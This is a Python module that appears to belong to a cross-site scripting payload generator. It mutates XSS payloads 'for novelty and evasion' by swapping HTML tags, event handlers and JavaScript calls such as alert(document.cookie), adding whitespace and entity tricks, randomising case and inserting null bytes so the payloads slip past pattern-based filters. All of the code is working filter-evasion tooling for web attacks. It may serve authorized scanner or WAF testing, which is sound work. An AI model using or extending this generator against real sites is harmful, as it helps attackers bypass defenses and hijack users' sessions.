"""
mutator — applies transformations to payloads for novelty and evasion
generates variations of existing payloads using structural mutations
"""

import logging
import random
import re

logger = logging.getLogger(__name__)

# tag alternatives for html injection
TAG_ALTERNATIVES = [
    "img", "svg", "video", "audio", "body", "input", "details",
    "marquee", "iframe", "object", "embed", "math", "table",
    "select", "textarea", "button", "form", "meter",
]

# event handler alternatives
EVENT_ALTERNATIVES = [
    "onerror", "onload", "onfocus", "onblur", "onmouseover",
    "onmouseenter", "onclick", "ondblclick", "onanimationend",
    "ontoggle", "onpointerover", "onpointerenter", "oncontextmenu",
    "onauxclick", "onbeforeinput", "onchange", "oncut", "onpaste",
    "onsearch", "onwheel", "onresize", "ontouchstart",
]

# js function alternatives for alert()
JS_FUNC_ALTERNATIVES = [
    "alert(1)", "confirm(1)", "prompt(1)", "print()",
    "alert`1`", "confirm`1`", "prompt`1`",
    "alert(document.domain)", "alert(document.cookie)",
    "top.alert(1)", "window.alert(1)", "self.alert(1)",
]


def mutate_payloads(
    payloads: list[dict],
    mutations_per_payload: int = 2,
    max_total: int | None = None,
) -> list[dict]:
    """
    generate mutated variants of the given payloads.
    returns the originals + their mutations.
    """
    all_results: list[dict] = list(payloads)
    seen = {p["payload"] for p in payloads}

    for original in payloads:
        text = original["payload"]
        mutations = _generate_mutations(text, mutations_per_payload)

        for mutated in mutations:
            if mutated not in seen:
                seen.add(mutated)
                all_results.append({
                    **original,
                    "payload": mutated,
                    "technique": "mutated",
                    "length": len(mutated),
                })

        if max_total and len(all_results) >= max_total:
            break

    logger.info(f"mutated {len(payloads)} originals into {len(all_results)} total")

    if max_total:
        return all_results[:max_total]
    return all_results


def _generate_mutations(payload: str, count: int) -> list[str]:
    """generate multiple mutations of a single payload"""
    mutations: list[str] = []
    strategies = [
        _swap_tag,
        _swap_event,
        _swap_js_func,
        _add_whitespace_tricks,
        _case_variation,
        _add_null_bytes,
    ]

    attempts = 0
    while len(mutations) < count and attempts < count * 3:
        strategy = random.choice(strategies)
        result = strategy(payload)
        if result and result != payload and result not in mutations:
            mutations.append(result)
        attempts += 1

    return mutations


def _swap_tag(payload: str) -> str | None:
    """replace html tag with an alternative"""
    match = re.search(r"<(\w+)", payload)
    if not match:
        return None
    original_tag = match.group(1).lower()
    alternatives = [t for t in TAG_ALTERNATIVES if t != original_tag]
    if not alternatives:
        return None
    new_tag = random.choice(alternatives)
    return re.sub(r"<" + re.escape(match.group(1)), f"<{new_tag}", payload, count=1)


def _swap_event(payload: str) -> str | None:
    """replace event handler with an alternative"""
    match = re.search(r"\b(on\w+)\s*=", payload, re.IGNORECASE)
    if not match:
        return None
    original_event = match.group(1).lower()
    alternatives = [e for e in EVENT_ALTERNATIVES if e != original_event]
    if not alternatives:
        return None
    new_event = random.choice(alternatives)
    return re.sub(
        re.escape(match.group(1)), new_event, payload, count=1, flags=re.IGNORECASE
    )


def _swap_js_func(payload: str) -> str | None:
    """replace javascript function call with an alternative"""
    patterns = [
        r"alert\s*\([^)]*\)",
        r"confirm\s*\([^)]*\)",
        r"prompt\s*\([^)]*\)",
        r"print\s*\(\)",
        r"alert`[^`]*`",
        r"confirm`[^`]*`",
        r"prompt`[^`]*`",
    ]
    for pat in patterns:
        match = re.search(pat, payload, re.IGNORECASE)
        if match:
            new_func = random.choice(JS_FUNC_ALTERNATIVES)
            return payload[:match.start()] + new_func + payload[match.end():]
    return None


def _add_whitespace_tricks(payload: str) -> str | None:
    """insert whitespace tricks to evade pattern-based filters"""
    tricks = [
        (r"(<\w+)", r"\1/"),           # <img/ onerror=...
        (r"(<\w+)", r"\1\t"),          # <img\tonerror=...
        (r"(<\w+)", r"\1\n"),          # <img\nonerror=...
        (r"=", "&#61;"),               # encode =
        (r"\s(on\w+=)", r" \1"),       # extra space before event
    ]
    trick = random.choice(tricks)
    result = re.sub(trick[0], trick[1], payload, count=1)
    return result if result != payload else None


def _case_variation(payload: str) -> str | None:
    """randomize case of html tags and attributes"""
    def random_case(match: re.Match) -> str:
        word = match.group(0)
        return "".join(
            ch.upper() if random.random() > 0.5 else ch.lower() for ch in word
        )

    result = re.sub(r"[a-zA-Z]+", random_case, payload)
    return result if result != payload else None


def _add_null_bytes(payload: str) -> str | None:
    """insert null bytes between tag characters to evade filters"""
    insertions = ["\x00", "%00", "\u0000"]
    insertion = random.choice(insertions)
    match = re.search(r"<(\w)", payload)
    if not match:
        return None
    idx = match.start() + 1
    return payload[:idx] + insertion + payload[idx:]
